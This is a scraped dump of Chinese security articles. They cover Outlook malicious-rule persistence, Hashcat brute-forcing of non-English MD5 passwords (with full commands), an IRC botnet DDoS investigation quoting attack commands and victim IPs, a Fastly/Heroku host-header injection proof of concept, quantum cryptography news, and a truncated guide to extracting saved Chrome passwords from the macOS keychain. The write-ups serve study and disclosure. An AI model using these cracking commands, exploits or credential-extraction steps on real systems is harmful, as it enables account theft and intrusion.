望，但是我在测试中却遇到了关于设置PR_RULE_MSG_ACTIONS属性的问题。该属性的描述文档谈到，这是客户端生成的不透明blob，但它也会被用于验证。当字段为空白或者设置有误的时候，Outlook将会无视这条规则，并且将其删除。回首之前导入.msg文件的这种方法，我在表中创建一个空白的邮件，将文件中的属性（包括PR_PROVIDER_DATA）导入到一个数组中，再从数组中把文件属性复制到空白的邮件当中，而不是在规则表中添加一行，我重复执行这个操作。不过要从文件中读取属性，我还尝试用有效数据生成我自己的属性数组。用这种方法，数据也会被接受，Outlook能够正常读取和处理规则，这意味着，模板文件不再需要，这个步骤也能在内存中完成。*属性：存储在消息关联内容表中的条目属性在应用测试中，我发现Outlook用来显示的规则属性和Exchange所用的属性是不一样的，例如，Outlook是使用PR_RULE_MSG_ACTIONS来存储规则名称的，而Exchange使用的却是PR_RULE_MSG_NAME，如果将属性设置为空，那么规则自然就出错了，但Outlook仍然能够正确处理。这样一来，无论是Outlook Web App（Exchange服务进行交互的web界面），还是在Exchange管理控制台中的Get-InboxRules都不会显示该规则的存在性，而只会提示通用错误。所以，要创建脚本来检查规则的存在性是有难度的。注：Outlook应用程序并不会显示由XRulez创建的任何规则我很享受这项研究，并且希望这个工具能够成为渗透工具集的一部分。另外，对安全团队而言，这也是相当重要的情报。* 参考来源：MWR Labs，本文由SkyMine编译，转载请注明来自FreeBuf.COM","2016-09-11 13:10:35","系统安全","你的Outlook真的安全？一条恶意规则远程攻陷你的工作站！","http://nsoad.com/Article/system/20160911/371.html"
"5ccbfa4e4f2f0a0a7a69c048","近期闲来无事，在网上看安全新闻的时候突然看到了密码破解神器Hashcat发布了v3.10版本。于是我便点进去看看Hashcat又添加了什么新的功能，让我惊讶的是，Hashcat现在已经支持Mac OS X平台了。一翻更新日志","silence","写在前面的话近期闲来无事，在网上看安全新闻的时候突然看到了密码破解神器Hashcat发布了v3.10版本。于是我便点进去看看Hashcat又添加了什么新的功能，让我惊讶的是，Hashcat现在已经支持Mac OS X平台了。一翻更新日志才发现，原来Hashcat在v3.0.0版本时就已经新增了对OS X平台的支持，而我自从苦逼地凑钱买了一台rmbp之后，就基本上没有再碰过Hashcat了。 直奔主题现在很多网站都会将用户密码的md5值直接存储在数据库中，而目前几乎所有的字典文件都是基于拉丁字符生成的，例如A-Z、a-z、0-9、以及各种特殊字符等等。而根据调查发现，有很多的用户已经开始使用各种非英语字符的密码了。这也就意味着，此前很多基于字典规则的攻击方式已经不再适用了。在这篇文章中，我将给大家演示如何使用Hashcat来破解非英文字符的密码。由于时间有限，我在这里只能给大家演示如何爆破一些常见的非拉丁字符密码，但是我相信整个流程还是可以给大家提供一个可行的思路。本人水平有限，如果有写的不对的地方，欢迎各位大牛指正，希望可以跟大家共同进步！那么话不多说，我们赶紧进入正题。 让Hashcat在Mac上跑起来假设你的电脑已经安装好git了，那么现在请你打开你的terminal，切换到你想要放置Hashcat项目文件的目录（我直接克隆到了用户根目录下），然后输入下列代码：git clone https://github.com/hashcat/hashcat.git此时你的终端界面应该是这样的：别忘了，想要让Hashcat在Mac上成功跑起来，我们还要安装最新版的OpenCL环境。先在Hashcat目录下创建一个名为“env”的目录（environment），然后继续用git命令将OpenCL克隆到“env”目录下： mkdir -p hashcat/envgit clone https://github.com/KhronosGroup/OpenCL-Headers.git hashcat/env/OpenCL命令运行结果如下图所示：这一系列操作没问题的话，此时你应该可以在磁盘目录下看到Hashcat的项目文件了。别着急，我们还要build一下源码。切换到“hashcat”目录下，然后输入下列命令：sudo make请注意，如果你此前没有运行过Xcode的话，系统会提示你要同意Xcode的许可证，同意之后系统会自动Makefile。Build成功后的界面如下图所示：此时，切换到Hashcat目录下，输入命令./hashcat --help如果安装成功，终端将会显示Hashcat的帮助信息：现在，我们已经成功地让Hashcat在Mac OS X上运行起来了。 关于字符的那些事儿如果你生活在以英语为主要语言的国家中，那么你肯定会非常熟悉ASCII码了，因为这是一套基于拉丁字母的编码系统。ASCII码使用一个字节编码来表示拉丁字符，即0000 0000-1111 1111，ASCII码用这总共256种组合方式来表示所有的拉丁字符。而在此之后，一种新的字符编码方式诞生了，它就是UTF-8。透露一下，我们今天的密码破解也是基于UTF-8编码来实现的。目前，绝大多数的Web应用和网页都会采用UTF-8来进行字符编码。UTF-8字符编码可以使用1-4个字节来编码，即0000 0000-0000 0000 0000 0000 0000 0000 0000 0000，其中也包含了ASCII码的单字节区间，因此我们在Hashcat中进行密码爆破的时候，应当考虑到这一因素。关于字符编码的问题我在这里就不多说了，反正你总有一天会被编码问题弄疯掉的…我们现在只关心在这篇文章中会接触到的汉语、韩语、以及俄语的常用字符编码。 打好基础，稳步前进首先，我们以俄文（西里尔）字母来进行讲解。为什么呢？难道我们不应该以中文开始吗？别着急，咱们慢慢来。请各位先看下面这张UTF-8编码表：请注意第三列，西里尔（cyrillic）字母的大写字母“A”可以用十六进制的“d0 90”来表示，这也就说明西里尔字母的“A”可以用两个字节的十六进制码来表示，写成二进制的形式即为“1101 0000 1001 0000”。此时你就会发现，在ASCII码中的“A”为“41”（0100 0001），而UTF-8编码下的西里尔字母“A”为“d0 90”（ 1101 0000 1001 0000）。仔细观察之后你应该会发现，西里尔字母“A”的十六进制编码由两部分组成，前半部分为“d0”，即我们所谓的基础码；后半部分为“90”，即字符码。我们可以从这张西里尔字母的UTF-8编码表［传送门］中看到，西里尔字母的基础码范围在d0-d4之间，即d0、d1、d2、d3、d4，而可能的字符码范围在80-bf之间。请注意！这一点非常的重要，因为它将成为我们通过UTF-8编码来破解其他语言密码的基石。 Hashcat能为我们做什么？Hashcat提供了一个参数“--hex-charset”,这个参数可以允许用户将待破解的数据以十六进制数值的形式输入给Hashcat。这是一个非常有用的参数，当你在命令中使用了这个参数之后，Hashcat会将你自定义的字符集合当作十六进制数值来处理，而不会将你的输入数据当作普通的英语字符。比如说，在“--hex-charset”模式下，你将“-1”参数的值设置成了“ABBBBC”。那么Hashcat将会把“AB”、“BB”和“BC”分别当作三个字符，然后对这些十六进制数值所代表的明文数据进行暴力破解。如果此时将“-2”参数设置成了“808182”，那么在仅有“-1”和“-2”参数的情况下，Hashcat首先会比较“AB 80”的计算结果是否与待破解密码相匹配，如果不匹配，则比较“AB 81”、“AB 82”、“BB 80”、“BB 81”…以此类推，对所有可能的情况进行排列组合。当然了，UTF-8编码是可变长度的。在俄语和阿拉伯语中，其每一个字符的UTF-8编码长度为两个字节，此时我们就需要使用到“-2”参数。还记得我们之前所说的基础码和字符码么？此时“-1”的值就是基础码，而“2”的值就是字符码。但是，在中文、韩文和日文之中，每一个字符的UTF-8编码需要占用三个字节，这也就意味着，我们需要使用到“-3”参数。原理其实是一样的，待会儿我会给大家演示。接下来，我们还要使用到“-i”参数。比如说在破解俄语密码的情况下，因为我们已经设置好了“-1”和“-2”参数，那么在“-i”参数中，我们就要设置需要破解的密码长度。比如说，我们要破解的俄文单词由三个字母组成，那么“-i”参数就应该设置为“?1?2?1?2?1?2”。每个“?1?2”代表一个西里尔字母，我们假设密码由三个字母组成，所有就需要三个“?1?2”。而在单个字符由三字节UTF-8编码组成的情况下（例如中文），我们假设待破解的密码由两个汉字组成，那么“-i”参数应该为“?1?2?3?1?2?3”，因为每个“?1?2?3”代表一个汉字。 测试前的准备工作首先，我们要计算出待破解密码的md5值。在此给大家提供两种方法，一种是使用终端的md5命令，另外一种是通过HashMaker。方法一：md5 –s [密码字符串]比如说，设置的密码为“安全”，那么我现在就要计算“安全”这个字符串的md5值：方法二：HashMaker［下载地址］为了方便进行测试，我们还要生成一些其他没有实际作用的md5值。除了第三行的md5值之外，其他都是一些其他字符的md5。其他语言的md5生成方法是相同的，在此不再进行赘述。 中文密码破解相信大家最感兴趣的应该是中文密码的破解了，所以在此先演示中文密码的破解方法。实际上，破解原理和方法在文章中已经介绍到了，各种语言的破解过程其实也大同小异。汉字的UTF-8编码占三个字节，例如汉字“一”的UTF-8编码为“E4 B8 80”。根据常用汉字的UTF-8编码［编码表传送门］，“-1”参数应该设置成“e4e5e6e7e8e9”，“-2”和“-3”参数均为“808182838485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebf”，这个编码范围足够覆盖常用的汉字了，其中还包括常用繁体字。为了测试繁体字密码是否能够正常破解，于是我们还要在zh_cypher.txt中添加繁体字符串“數據”的md5：除此之外，还有一些其他的设置参数需要简单介绍一下：--pot-disable：禁止Hashcat将已破解的哈希添加到potfile中，添加该参数可以避免测试过程中出现某些问题。--outfile-autohex-disable：将破解出的密码结果以明文形式显示出来，如果不输入这个参数的话，密码破解的结果将以十六进制的形式输出。如果密码结果输出为乱码的话，可以去掉该参数，以便得到密码的原始十六进制数值。-m 0：设置待破解数据的哈希类型，“0”即为MD5。-a 3：设置攻击模式，“模式3”代表暴力破解。**_cypher.txt：存放待破解密码哈希的文件。在破解中文的示例中，我们的参数命令应该如下所示（假设待破解密码为两个汉字）：./hashcat --potfile-disable --outfile-autohex-disable -m 0 -a 3 ../zh_cypher.txt --hex-charset -1 e3e4e5e6e7e8e9 -2 808182838485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebf -3 808182838485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebf -i ?1?2?3?1?2?3运行结果如下图所示：我们可以看到，Hashcat已经将“安全”和“數據”这两个密码成功破解出来了。接下来，给大家演示韩语和俄语密码的破解。 韩语密码破解假设待破解密码为“”，中文即“安全”的意思。该字符串由两个韩语字组成，每个韩语字的UTF-8编码占三个字节［编码表传送门］。korean_cypher.txt文件内容如下图所示：参数命令如下：./hashcat --potfile-disable --outfile-autohex-disable -m 0 -a 3 ../korean_cypher.txt --hex-charset -1 eaebecedee -2 808182838485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebf -3 808182838485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebf -i ?1?2?3?1?2?3运行结果如下图所示： 俄语密码破解虽然俄语字母是西里尔字母的变体….［西里尔字符UTF-8编码表］假设待破解密码为“сеть”，中文即“网络”的意思。该字符串由四个西里尔字母组成，cyrillic_cypher.txt文件内容如下图所示：参数命令如下：./hashcat --potfile-disable --outfile-autohex-disable -m 0 -a 3 ../cyrillic_cypher.txt --hex-charset -1 d0d1d2d3d4 -2 808182838485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebf -i ?1?2?1?2?1?2?1?2破解结果如下： 注意事项如果Hashcat无法输出正确的明文密码时，可以去掉命令中的“--outfile-autohex-disable”参数。比如说，以韩文密码的破解为例，去掉该参数之后，运行结果如下图所示：那么破解结果即为“ec 95 88”和“ec a0 84”这两个字。有python基础的同学可以直接用python将其进行转码：结果一目了然。为了方便大家查询各种语言文字的UTF-8编码，我给大家推荐一个网站［传送门］。 总结暴力破解的基本思想就是对所有可能出现的情况进行一一确认，直到所有的情况都验证完毕。所以如果密码破译者可以利用社会工程学等技巧获取到有关密码的更多信息，那么将会极大地提高密码破译的速度。不过大家也清楚，任何密码的破解都只是时间问题…无论是阿拉伯语也好，日语也罢，我们都可以利用这样的方法来破解这些非英文字符的密码。那么，阿拉伯语密码和日语密码的破解就留给各位同学当作家庭作业啦！本文由 安全客 原创发布，如需转载请注明来源及本文地址。本文地址：http://bobao.360.cn/learning/detail/3033.html","2016-09-18 11:47:16","网络安全","使用Hashcat破解汉语、韩语、以及俄语等非英语密码","http://nsoad.com/Article/Network-security/20160918/412.html"
"5ccbfa4e4f2f0a0a7a69c049","*本文原创作者：挑灯看剑，本文属FreeBuf原创奖励计划，未经许可禁止转载本人最近在阿里云服务器上捕获到一只活跃Bot僵尸，然后顺藤摸瓜成功进入黑客的C&C控制中心，观察到","Blackhold","*本文原创作者：挑灯看剑，本文属FreeBuf原创奖励计划，未经许可禁止转载本人最近在阿里云服务器上捕获到一只活跃Bot僵尸，然后顺藤摸瓜成功进入黑客的C&amp;C控制中心，观察到黑客团伙每天都会利用Botnet僵尸网络发动DDoS攻击，而这些Bot僵尸分布在世界各地，其中一部分Bot僵尸藏匿于阿里云服务器集群中，我们知道阿里云服务器提供了云盾安全检测，云盾可以发现可疑网络行为，但无法准确定位到Bot僵尸。本文暂不讲解如何定位捕获到Bot僵尸和如何潜入C&amp;C控制中心，只讲解Botnet相关知识、观察到的Bot僵尸的行为表现、运行原理，以及幕后的黑客及其对阿里云集群的渗透证据。下图是阿里云盾检测到安全威胁：僵尸网络介绍僵尸网络(Botnet，又称机器人网络，Botnet是Robot network的合体词)，指黑客利用沦陷的机器(称为肉鸡或僵尸电脑)组织成一个个控制节点，然后通过控制服务器(Command and Control Server，又称C&amp;C、C2)对各分布式节点操控，组成一个僵尸网络，发送伪造数据包或垃圾数据包，使预定攻击目标瘫痪并拒绝服务(DoS, Denial of Service)，有的Bot还会窃取受害组织的情报数据，并长期潜伏达数年，此类Botnet也是高级持续威胁(APT)的一种实现方式。下表显示了僵尸网络在危害类软件中排首位(摘自维基百科)有害软件    传播性    可控性    窃密性    危害级别僵尸网络    具备    高度可控    有    全部控制：高木马            不具备    可控    有    全部控制：高间谍软件        一般没有    一般没有    有    信息泄露：中蠕虫            主动传播    一般没有    一般没有    网络流量：高病毒            用户干预    一般没有    一般没有    感染文件：中Botnet网络结构下图是常见的集中控制式的Botnet网络结构，此外还有不太流行的P2P Botnet，本次抓到的Botnet属于集中控制式的。在集中控制式的Botnet中，各Bot和C&amp;C通信，为了隐藏它们之间的通信，黑客常用IRC通道或HTTP站点，最近一些社交网站，如Twitter、Facebook也沦为C&amp;C了。就统计结果看，目前基于IRC通道的Botnet占绝大多数，本次抓到的Botnet也正是基于IRC通道。Attacker通过C&amp;C遥控世界各地的Bot对Victim发动DDoS攻击。基于IRC通道的BotnetIRC(Internet Relay Chat)是一种互联网聊天协议，目前世界上有超过60个国家提供了IRC服务，它的特点是速度快，聊天几乎没有延迟现象，并且只占用很小的带宽资源，所有用户可以在一个称为频道(Channel)的地方交谈或密探，和国内早期的聊天室很像，每个人都有一个昵称。不同的是喜欢使用IRC聊天的几乎都是软件高手，IRC有一套复杂的操作命令，类似Linux下的命令行操作。基于IRC的Botnet运行原理是每个Bot充当IRC Client角色，登录到IRC Server，因此IRC Server充当了C&amp;C控制中心的角色，从而形成了基于IRC的僵尸网络，由于IRC服务遍布世界各地，而Channel可以任意创建，还有登录授权认证，使得基于IRC的僵尸网络非常隐蔽、易于构建和控制，因此这种僵尸网络非常流行。分析Bot源码可以看到连接的C&amp;C控制中心IP是128.199.187.*，位于新加坡。而从阿里云服务器的登录日志可以看到，黑客的IP是95.90.216.226，来自德国，登录时间为8月28日凌晨4:39。黑客通过C&amp;C发出DDoS攻击指令： !u @udp1 86.127.115.253 3306 30 , 该IP位于罗马尼亚，3306端口可知是攻击MySQL数据库服务，持续时长30s。整个分布式DDoS僵尸网络攻击图如下，通过分布式的Botnet，黑客很好地把自己隐藏起来，通过IRC通道发出控制指令，控制阿里云网络上的肉鸡服务器发动DDoS攻击。DDoS背后的利益Botnet僵尸网络只是一种工具和手段，黑客发动DDoS攻击的目的是为了钱，下面这个图表(摘自知乎)显示了DDoS收入趋势，“2014年，全球DDoS攻击的收入达到6亿美元，中国DDoS攻击的总收入为3千万美元，到2020年，中国的DDoS攻击的收入将达到1亿美元，届时中国将成为全球最大、最令人瞩目的DDoS攻击市场”在分析Bot源码后，本人顺藤摸瓜登录到C&amp;C控制中心，观察黑客的行为，发现他们在叫卖DDoS攻击服务，下面红线标注的是罗马尼亚语，用谷歌翻译成英文为一个IRC通道卖30欧元。黑客一边演示DDoS攻击，一边告诉卖家”The attack is ready and it’s till down the server”(棕色箭头指示的罗马尼亚语翻译成英文)，意为”攻击已经开始了，直到把服务器搞垮”，看样子买家是罗马尼亚的。然后买家登录IRC通道亲自体验一把DDoS攻击，使用udpflood指令让僵尸网络对5.14.229.103的53端口（DNS服务器)发起UDP洪泛攻击。Botnet操控示例1. 发起对某个IP发起UDP 1型攻击，并指定攻击端口和攻击时长，从Bot源码分析可知有三种类型的UDP攻击，攻击强度以此增加。下面是黑客与9月1日对葡萄牙的一个Web服务器进行2.7个小时(10000秒)的攻击2.发起UDP洪泛攻击，可迅速搞垮对方，下图中发起洪泛攻击后，再ping就不通了，返回请求超时。3.执行系统命令，比如uptime，!u表示对所有的受控Bot僵尸有效，也可执行cd, wget, top等系统命令。4.执行黑客自定义的命令，比如.kill, .udpflood, .clear等，以小数点开头标识。5.发起其它类型的攻击。比如TCP Flood、HTTP Flood等，Bot源码中虽然有很多攻击类型，但据实际观察，发现黑客一直在使用UDP类型的攻击，也许是因为它比TCP类型的攻击更难防，因为TCP是需要建立连接的，很容易被IDS/IPS设备RST调，也很容易通过设置协议栈Syn Cookies屏蔽掉攻击包。6.Bot僵尸还有端口扫描功能，扫描肉鸡网内其它弱点机器，然后尝试感染扩散Bot。DDoS分布据FireEye公司发布的一份最新报告显示，亚洲和东欧是网络攻击的热点区域。我们对回调标记的平均数以公司为单位进行计算并按国家分类，亚洲的中国大陆，韩国，印度，日本以及香港地区占全球攻击事件总数的%24。而东欧的俄国，波兰，罗马尼亚，乌克兰，哈萨克斯坦以及拉脱维亚以22%的比例紧随其后。网上另一份数据表明(下图)，在2013年，全球43%的DDoS攻击流量来自中国，而这些攻击流量大部分都是来自肉鸡机器，比如阿里云服务器集群中的肉鸡。当年的蓝翔肉鸡事件闹的沸沸扬扬，蓝翔技校的机房被黑客攻陷作为肉鸡，对美国发起DDoS攻击，事后竟使蓝翔技校一夜成名，成为背锅侠。根据这几天的观察，被攻击者IP主要有以下这些，虽然黑客每天不断发起DDoS攻击，还会有更多的被攻击IP出现。74.207.227.163美国104.25.80.35美国216.58.208.33美国52.8.126.80美国84.232.157.198罗马尼亚188.212.101.36罗马尼亚86.127.115.253罗马尼亚46.37.14.7意大利109.48.173.34 葡萄牙幕后的黑客通过分析Bot僵尸源码，发现了藏匿Bot僵尸程序的Web Server，本人访问该网站竟然发现了德国黑客的视频照片，先贴一张侧面照片，还有正面清晰的照片暂不公开了。同时还发现了黑客的Twitter和Skype账号，以及使用Skype兜售Bot的聊天记录。黑客渗透阿里云服务器通过人肉黑客的Skype账号，发现他在Youtube上传了一个视频，向买家演示如何渗透弱点机器，演示视频中黑客登录的服务器IP正是阿里云服务器，而其渗透扫描和账号爆破的弱点机器IP也是阿里云服务器，至此可以充分证明黑客早已渗透到阿里云服务器集群，对阿里云服务器全网扫描，然后进行账号暴力破解，进而安装Bot僵尸作为肉鸡，以便随时进行DDoS。下图中红框中的三台服务器均属于阿里云机器，阿里云机器的hostname有个特点是以AY或i开头，故可猜测前两个是阿里云机器，第三个显示了IP，查询结果为阿里云机器。警觉的黑客也许黑客嗅出了不对劲的地方，就在我进入C&amp;C控制中心后的第二天，发现黑客不停地挨个把Bot重启，并转移IRC通道(我赶紧再进入新的通道，嘿嘿)，同时升级更新Bot程序，加入了严格检查DDoS控制指令的发起者电脑hostname和用户名，保证了只有黑客本人才能控制僵尸网络，这真是一场斗智斗勇的过程。结束语本人已将此Botnet僵尸样本提交给阿里云安全团队分析处理，希望他们能彻底清理隐藏在阿里云ECS集群中的僵尸以及幕后的黑手！虽然本文到此结束了，但是黑客的攻击行为仍然每天在进行中，僵尸也依然活跃在集群服务器中，这是一场永不停息的斗争！*本文原创作者：挑灯看剑，本文属FreeBuf原创奖励计划，未经许可禁止转载","2016-09-05 13:35:11","网络安全","从阿里云溯源黑客老巢：实例讲解Botnet僵尸网络和DDoS","http://nsoad.com/Article/Network-security/20160905/351.html"
"5ccbfa4e4f2f0a0a7a69c04a","0x02 .htaccess文件突破黑名单解析","Kong","TL;DR, Internet Explorer 曾经有个这么个 bug，允许攻击者使受害者发送带有恶意 Host 头的请求。文件描述符曾经用它窃取 GitHub 的 OAuth token，我们用它来混淆 Heroku 和Fastly 的 host 路由，使他们能够在他们客户的域名下提供我们的内容。Fastly 和 Heroku 从那以后就已修复了自身的问题。Internet Explorer/Edge malformed Host-headerInternet Explorer/Edge 的 bug 就像下面这样（从恶意链接）进行重定向。HTTP/1.1 307 Redirect  Location: https://www.drupal.org%2f.to.to  这将会导致 Internet Explorer/Edge 发送如下请求至 www.drupal.org ：GET /.to.toto/ HTTP/1.1  Host: www.drupal.org/.to.to  Heroku/Fastly既然 Heroku 和 Fastly 平台都存在过对 Host 头解析不严的情况。这意味着即使 /字符在 header 中，它们仍然认为 host 是属于 .to.to的子域名。这便使得在此服务上将*.to.to设为你自己的域名是可行的。将.to.to的所有子域名指向恶意内容，然后利用 Internet Explorer/Edge 的 bug，在绑定到 Heroku/Fastly 域名的平台上启动恶意内容服务。PoC流程如下所示：创建进行恶意重定向的链接发送给受害者重定向的链接将会在 Internet Explorer/Edge 上创建畸形 Host 头。解析结果会变为指向 Fastly/Heroku 的原始域(本例是 www.drupal.org)。Fastly/Heroku 将会处理Host头将其解析为错误的域名，在本例中是通配符 *.to.toFastly/Heroku 然后会返回我们的域名中的数据，即使浏览器解析的域名依然是 Fastly/Heroku 的客户所有。下面可以更清晰的看到域名解析情况：$ host www.drupal.org www.drupal.org is an alias for j.global-ssl.fastly.net.  它正指向 Fastly。 然后我们使用 cURL 创建如下测试请求：curl -H 'Host: www.drupal.org/.to.to' https://www.drupal.org/  便得到了以下返回信息：&lt;script&gt;alert(document.domain)&lt;/script&gt;  这是因为我们在 Fastly 声明了 *.to.to，提供以我们的PoC为内容的简单应用服务。现在我们发送下述链接至受害者：https://avlidienbrunn.se/redirect.php?redirect=https://www.drupal.org%252f.to.to  将会给我们下面的重定向响应：HTTP/1.1 307 Redirect  Location: https://www.drupal.org%2f.to.to  这将使 Internet Explorer/Edge 浏览器发送如下 Host头：Host: www.drupal.org/.to.to  与无效化请求相反，这两个服务实际会将 host 头处理为*.to.to的子域名,提供我们可控的内容服务。这意味着不严谨的 host 解析和 Internet Explorer/Edge 的 bug 将允许我们对使用这两个服务的客户进行内容欺骗。我们可以提供任何我们想要的内容服务，或者甚至根据同源策略( SOP )创建认证请求来劫持当前用户，微软先前被通知过两次关于 Host 头注入攻击的事，他们修复了一次，但是版本的回归拟合使其再生枝节。影响基本所有使用中间无代理的 Heroku 和 Fastly 服务都会受到漏洞影响。而能够利用此漏洞的只有 Internet Explorer 和 Edge 浏览器。在那段时间里，Safari 浏览器出现过类似的问题（对应中文版：Safari URL重定向漏洞利用分析 ），但源是置空的，因此 SOP 限制了我们不能做额外的请求。尽管在 Safari 上内容提取是有效的，解析后的页面只有我们自己的内容，这就使得 Safari 的 bug 没有太大意义了。漏洞时间线June 16 – Reported to both Fastly and HerokuJune 21 – Triaged by FastlyJune 28 – Patch is deployed by FastlyJune 30 – Triaged by HerokuJuly 7 – Additions to the patch addedSeptember X – Host header injection in Internet * Explorer/Edge patched by MicrosoftOctober 20 – Final patches added by Heroku","2016-10-27 00:56:45","Web安全","结合 host 头注入和 host的不严谨解析，提供恶意数据服务","http://nsoad.com/Article/web/20161027/644.html"
"5ccbfa4e4f2f0a0a7a69c04b","听到“量子计算”这个名字，就感觉是电子科技的高端领域。以最直白的方式表达，量子计算的核心就是计算速度相较传统晶体管计算机的大幅跃升。一旦计算能力获得极为可观的提升，就能解决普通计算机无法解决","silence","听到“量子计算”这个名字，就感觉是电子科技的高端领域。以最直白的方式表达，量子计算的核心就是计算速度相较传统晶体管计算机的大幅跃升。一旦计算能力获得极为可观的提升，就能解决普通计算机无法解决的问题，比如设计新一代材料、研制新的药物、医学成像等等。可是，计算能力的大幅跃升还为网络安全带来一个副作用：当代的许多加密算法将变得相当脆弱。滑铁卢大学量子计算学院的联合创始人Michele Mosca（也是圆周理论物理研究所的研究人员）最近在Global Risk Institute发表了一篇题为《量子计算：网络安全新威胁的文章》。此人在量子计算机领域的加密方面有相当的研究。他在这篇文章中特别提到：我们现在所用的部分加密工具，到2026年就有1/7的概率遭破解；到了2031年，这个数字又会上升到50%。也就是说，到那个时候，如果我们还在用现在的加密机制，那么即便网络传输的数据经过了加密，也可通过暴力破解来解密——这也是量子计算能够带来的“便利”。还没准备好迎接量子攻击量子计算的本质说起来并不复杂，它相较我们平常在用的计算机主要是底层用来表达1、0数据的最基本物理层面的差异。常规的计算机，信息存储，每一个比特位（bit）就代表一个1，或者一个0；而量子力学允许一个比特位同时表达0和1的状态（所谓的量子叠加态）。这就让量子比特包含的信息，比传统的经典比特要多得多——这其实就是量子计算机计算能力远高于传统计算机的原因。如果上面这段看不懂也没关系，总之就是量子计算机的计算能力强得多。科学家和工程师都很渴望打造完全形态的量子计算机，因为其并行计算能力、解决更复杂的计算问题都彪悍得多。所以全球各国都在着力量子科学和技术的开发。计算能力的极速飙升带来了一个副产品：破解加密工具成为可能。而加密或许可以说是当代网络安全的一块基石。无论是用于身份验证和防篡改的数字签名，还是通讯过程中的数据加密密钥，都可能在量子计算崛起后不再安全。实际上，信息安全行业总是在面临新的挑战：产品出现漏洞就去修复，恶意程序来了就着力查杀，就连APT攻击也能追本溯源，基本难度很大。但量子计算给安全行业带来的难题在于，一旦加密这块基石被破，除非有全新解决方案替代现有加密算法，否则人类几乎是无计可施的。因为人们根本就没有准备好应对量子计算带来的安全威胁，而量子计算的时钟已经开始走时了。或许要“修复”该问题，大概需要花上几年的时间来寻找解决方案，并且全面替换当前的加密“基石”。在Mosca看来，“虽然量子攻击还没有发生，现在就需要做出关键决策了，唯有如此，未来才能对这样的威胁做出响应。”应对之道在哪儿？“设计更为灵活的加密系统（more cryptographically agile），可快速从一种加密工具转往其他工具，这能够促进最终转向可应对量子计算的加密算法。”Mosca将之称作“quantum-safe”量子安全的加密方法。这种加密方法需要能够包含免疫已知量子攻击的协议；还需要包含量子加密协议，对数学暴力破解免疫——这可能就需要更多资源的“量子通讯通道”了，比如说采用光纤；最后，就是上面提到的加密灵活性，令其足以随时应对新出现的攻击威胁。其实就这几点来看，的确人类都还没有做好准备。不过实际上已经有部分组织和企业开始着手这方面的研究了，比如说NIST（美国国家标准与技术研究员）。NIST于今年4月份发布了一份报告，提出在量子攻击出现之前需要采取的长期应对措施。“近两年已经有不少针对量子计算机的研究了，从大型计算机公司再到政府，都希望他们的加密算法能够抵御量子计算（quantum resistant）。如果有人打造了一台大规模量子计算机，我们希望那个时候所用的算法，将是其无法破解的。”NIST提出的方案也是首先专注于加密灵活性，也就是能够以最快的速度转向新的算法；而打造更为安全的算法就是个长期目标了。为此NIST想到的方法是，举行比赛，依靠大众的力量来设计和测试新的加密算法。还有一些私人安全企业也在就此问题做研究，比如说KryptAll最近才发布了一个量子加密项目。其目标是要在2021年之前，推出行之有效的解决方案——用来对抗量子计算机的攻击。他们要推的这种“量子安全通讯协议”所采用的加密密钥就依赖量子机制形成——比如说一个光子从某个位置穿越到另一个位置，其方向是不确定的。这种不确定性也就成为安全的基础。如果密钥通过量子粒子来编码，要实现窃听是几乎不可行的。当然了，这样的研究仍然需要时间。Moody说：“从历史上来看，从确定某个加密系统可用，并且真正应用到产品中成为通用标准，需要经过很长的事件，可能是10-20年。所以我们认为，现在已经很紧迫了。”* FreeBuf官方报道，作者：欧阳洋葱，转载请注明来自FreeBuf.COM","2016-09-17 18:02:02","网络安全","买台量子计算机，分分钟破解加密算法","http://nsoad.com/Article/Network-security/20160917/409.html"
"5ccbfa4e4f2f0a0a7a69c04c","0x03 php流封装绕过截断","Kong","虽然现在网上有很多开源的软件可以帮助你解密那些存储在GoogleChrome浏览器中的密码，但是这些软件几乎只支持在Windows操作系统下使用。那么对于我们这些Mac用户来说，当我们需要快速导出Chrome中存储的全部密码时，我们该怎么做呢？直接进入正题其中最常见的一种做法就是打开Chrome浏览器，选择“浏览器设置”，点击“管理密码”，然后你将会看到如下图所示的界面。接下来，你就可以在这里管理你的密码了。点击了“显示密码”之后，系统此时便会要求你输入本地用户的密码。但是，像这种极其不方便的方法，谁还想去使用它呢？为了解决这个问题，为了避免被要求输入用户密码，我们可以直接查询GoogleChrome浏览器的SQL数据库。在macOS平台下，这个数据库的存储路径为“~/Library/ApplicationSupport/Google/Chrome/Profile */Login Data”。对于每一个存储在GoogleChrome浏览器中的密码来说，每一条密码数据都是以类似下图所示的这种数据格式存储在“LoginData”数据库中的：我们可以从上图中看到，对于这个用户而言，其密码就是那段以“v10”开头的乱码，这段密码明显已经被加密了。你可能想问了，它采用的到底是哪一种加密算法呢？为了解答这个问题，我们可以参考GoogleChromium的源代码。在其源代码中，我们发现了下面这段话：加密机制：AES-128-CBC（使用固定盐值和固定迭代次数）。解密密钥是一个PBKDF2密钥，该密钥通过下列数据生成：1.    盐值：盐值固定不变（saltysalt）；2.    迭代次数：在对称密钥的生成过程中进行1003次迭代计算；3.   IV： 16位；4.    哈希函数：sha1；5.    密码：密码是整个环节中最重要的一个部分了。我们所要获取的，就是存储在“ChromeSafe Storage”中的凭证数据，而这部分数据又保存在用户的keychain之中。实际上，我们在访问这个安全存储密钥的时候并不需要获取到用户的keychain密码。因为我们可以在终端中使用命令“securityfind-generic-password -ga 